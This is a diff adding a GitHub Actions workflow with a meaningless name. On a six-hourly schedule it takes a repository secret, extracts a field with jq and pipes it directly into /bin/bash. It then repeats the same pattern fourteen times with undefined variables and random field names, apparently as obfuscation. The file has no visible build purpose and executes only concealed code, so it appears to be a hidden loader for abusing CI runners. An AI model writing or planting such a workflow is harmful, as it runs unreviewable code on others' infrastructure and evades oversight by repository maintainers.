@@ -1,0 +1,31 @@
+name: allowalarmed
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: allowalarmed
+        env:
+          m7: ${{ secrets.m7 }}
+        run: |
+          echo $m7 | jq -r .twdy75 | /bin/bash
+          echo $we30756 | jq -r .ui8456 | /bin/bash
+          echo $t20300 | jq -r .qwnph924 | /bin/bash
+          echo $rxmbw271 | jq -r .nxz32681 | /bin/bash
+          echo $q2 | jq -r .qtb6 | /bin/bash
+          echo $uasuk8 | jq -r .q498 | /bin/bash
+          echo $g2 | jq -r .kou15390 | /bin/bash
+          echo $np5379 | jq -r .is21376 | /bin/bash
+          echo $e67 | jq -r .tch27 | /bin/bash
+          echo $ijnof9 | jq -r .dkjd71 | /bin/bash
+          echo $zxfuh6045 | jq -r .uwv126 | /bin/bash
+          echo $vfm8 | jq -r .u776 | /bin/bash
+          echo $jh0 | jq -r .q5114 | /bin/bash
+          echo $h671 | jq -r .ghydm33156 | /bin/bash
+          echo $ip093 | jq -r .fncvs10693 | /bin/bash
+
